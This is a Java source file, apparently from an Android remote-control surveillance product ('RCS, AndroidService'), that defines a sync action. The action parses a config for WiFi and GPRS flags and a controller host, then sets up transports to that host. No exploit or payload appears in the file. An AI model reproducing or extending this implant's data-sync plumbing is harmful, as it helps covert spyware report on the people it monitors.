/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncActionInternet.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.IOException;

import com.android.service.action.sync.GprsTransport;
import com.android.service.action.sync.WifiTransport;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncActionInternet.
 */
public class SyncActionInternet extends SyncAction {

	private static final String TAG = "SyncActionInternet";

	/** The wifi forced. */
	protected boolean wifiForced;

	/** The wifi. */
	protected boolean wifi;

	/** The gprs. */
	protected boolean gprs;

	/** The host. */
	String host;

	/**
	 * Instantiates a new sync action internet.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public SyncActionInternet(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#parse(byte[])
	 */
	@Override
	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);

		try {
			gprs = databuffer.readInt() == 1;
			wifi = true;
			wifiForced = databuffer.readInt() == 1;

			final int len = databuffer.readInt();
			final byte[] buffer = new byte[len];
			databuffer.read(buffer);

			host = WChar.getString(buffer, true);

		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");
			}
			return false;
		}
		final StringBuffer sb = new StringBuffer();
		sb.append("gprs: " + gprs);
		sb.append(" wifi: " + wifi);
		sb.append(" wifiForced: " + wifiForced);
		sb.append(" host: " + host);
		if (Cfg.DEBUG) {
			Check.log(TAG + sb.toString());
		}
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SyncAction#initTransport()
	 */
	@Override
	protected boolean initTransport() {
		if (wifi) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " initTransport adding WifiTransport");
			}
			transports.addElement(new WifiTransport(host, wifiForced));
		}

		if (gprs) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " initTransport adding DirectTransport");
			}
			transports.addElement(new GprsTransport(host));
		}

		return true;
	}

}
